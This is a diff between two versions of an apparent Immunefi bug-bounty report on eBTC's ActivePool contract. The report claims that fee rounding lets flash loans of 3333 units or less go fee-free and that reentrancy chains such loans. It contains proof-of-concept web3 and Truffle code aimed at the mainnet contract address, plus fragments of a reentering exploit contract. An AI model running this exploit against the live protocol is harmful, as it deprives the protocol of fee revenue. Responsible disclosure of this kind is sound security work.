@@ -1,24 +1,24 @@
+
 # FlashLoan can be taken with no fee to be paid
 
-Submitted about 1 month ago by @Mirrors (Whitehat) for Boost | eBTC
+Submitted on Tue Feb 20 2024 10:02:57 GMT-0400 (Atlantic Standard Time) by @OceanAndThunders for [Boost | eBTC](https://immunefi.com/bounty/ebtc-boost/)
 
 Report ID: #28546
 
 Report type: Smart Contract
 
-Has PoC? Yes
+Report severity: Insight
 
 Target: https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/ActivePool.sol
 
-# Impacts
+Impacts:
 - Protocol insolvency
 
-# Details
-
+## Description
+## Brief/Intro
 The bug does not involve direct theft of funds, but it is a violation of how the the contract is meant to operate, it's exploitation can make the protocol offers flashloans without getting the fees of the loan back from users
 
-# Vulnerability Details
-
+## Vulnerability Details
 The contract "ActivePool" is meant to offer flash loan for the collateral token for users via the `ActivePool.flashLoan` function, well for the users to have a flashloan they must on the callback sends back the borrowed assets of `address(collateral)` with the calculated fees via `flashFees(address(collateral, amount))` see on "https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/ActivePool.sol?utm_source=immunefi"
 
 ```
@@ -44,18 +44,28 @@ The problem is that when `amount` + `feeBps` are under MAX_BPS, (MAX_BPS > amoun
 
 as for example if consider calling the actual ActivePool in production (0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590) we will see that the `feeBps` is 3 and `MAX_BPS` is actually 10000, so any number that is under or equal to MAX_BPS / feeBps (3333) will returns it's fees as 0 !
 
-use the following truffle (combine it with Ganache) Poc
 
-`truffle console --networkId 5777`
-
-shows "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590" how it returns 0 as fees for amount of 3333 or under
+use the following truffle (combine it with Ganache) Poc 
 
 ```
+truffle console --networkId 5777
+```
+
+shows "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590" how it returns 0 as fees for amount of 3333 or under 
+
+
+
+```
+
 const Web3 = require('web3');
 //save 0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590 abi on test/abi.json
 
 const abi = require('./test/abi.json');
 const activePool_contract = "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590";
+
+
+
+
 
 const activePool = new web3.eth.Contract(abi,activePool_contract);
 
@@ -71,27 +81,42 @@ means that for any number that is/or under 3333 we pay no fees
 
 That was the first issue
 
-Secondly the function is not protected against reentrancy attacks ! when a malicious actor that re-enters the ActivePool.flashLoan function 10 times on the "onFlashLoan" call with amount as 3333, he will get a flash loan of 33330 with 0 fees ! while the protocol was supposed to get 9 fees on it !
+Secondly the function is not protected against reentrancy attacks !
+when a malicious actor that re-enters the ActivePool.flashLoan function 10 times on the "onFlashLoan" call with amount as 3333, he will get a flash loan of 33330 with 0 fees ! while the protocol was supposed to get 9 fees on it !
 
-# Impact Details
+
+
+## Impact Details
 Combination of both can lead to the protocol being providing a flash loan of any number without getting any fees back, the attacker will consider paying only the high gas fees and not actually paying fees to ActivePool, those fees are the actual profit of the protocol, the existence of the bug means no profit for the protocol !
 
-# Proof of concept
 
+
+        
+## Proof of concept
+## Proof of Concept
 ActivePool is deployed on mainnet at "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590"
 
-use the following truffle (combine it with Ganache) Poc
-
-`truffle console --networkId 5777`
-
-shows "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590" how it returns 0 as fees for amount of 3333 or under
+use the following truffle (combine it with Ganache) Poc 
 
 ```
+truffle console --networkId 5777
+```
+
+shows "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590" how it returns 0 as fees for amount of 3333 or under 
+
+
+
+```
+
 const Web3 = require('web3');
 //save 0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590 abi on test/abi.json
 
 const abi = require('./test/abi.json');
 const activePool_contract = "0x1e3Bf0965dca89Cd057d63c0cD65A37Acf920590";
+
+
+
+
 
 const activePool = new web3.eth.Contract(abi,activePool_contract);
 
@@ -105,7 +130,9 @@ await activePool.methods.flashFee("0xae7ab96520de3a18e5e111b5eaab095312d7fe84",3
 
 means that for any number that is/or under 3333 we pay no fees
 
+
 ```
+
 interface IActivePool {
 
 function flashLoan(
@@ -150,6 +177,7 @@ IERC20(token).approve(msg.sender,type(uint256).max);
 // the loan will be paid 3333 for eah call and each call will give back 0 fees !
    }
 }
+
 ```
 
 PoC of truffle :
@@ -193,8 +221,15 @@ it("setUp and exploit", async () =>  {
  });
 ```
 
+
+
+
 The call re-enters 3 times (as pr desired amount is 3333 * 3 to reach) the flashloan will be taken and pays back 0 as fees
 
+
+
+
 Regards,
+
 
 Adam
